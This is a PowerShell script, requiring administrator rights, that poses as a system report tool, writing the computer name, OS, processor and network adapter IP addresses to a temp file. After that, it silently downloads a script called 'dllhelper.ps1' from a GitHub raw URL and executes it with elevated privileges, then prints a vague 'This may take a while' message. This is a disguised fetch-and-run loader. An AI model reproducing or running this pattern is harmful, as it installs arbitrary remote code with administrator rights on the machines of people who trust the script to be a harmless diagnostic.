#Requires -RunAsAdministrator

$ErrorActionPreference = "Continue"
$WarningPreference = "Continue"
$InformationPreference = "Continue"
$VerbosePreference = "Continue"
$ProgressPreference = "Continue"

$systemInfo = Get-WmiObject -Class Win32_ComputerSystem
$osInfo = Get-WmiObject -Class Win32_OperatingSystem
$processorInfo = Get-WmiObject -Class Win32_Processor

$reportPath = "$env:TEMP\system_report_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
"System Report Generated: $(Get-Date)" | Out-File -FilePath $reportPath
"Computer Name: $($systemInfo.Name)" | Out-File -FilePath $reportPath -Append
"OS Version: $($osInfo.Caption)" | Out-File -FilePath $reportPath -Append
"Processor: $($processorInfo.Name)" | Out-File -FilePath $reportPath -Append

$networkAdapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}
foreach ($adapter in $networkAdapters) {
    "Adapter: $($adapter.Description) - IP: $($adapter.IPAddress)" | Out-File -FilePath $reportPath -Append
}

$remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"
$script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing
$sb = [scriptblock]::Create($script)
& $sb

Write-Output "This may take a while"
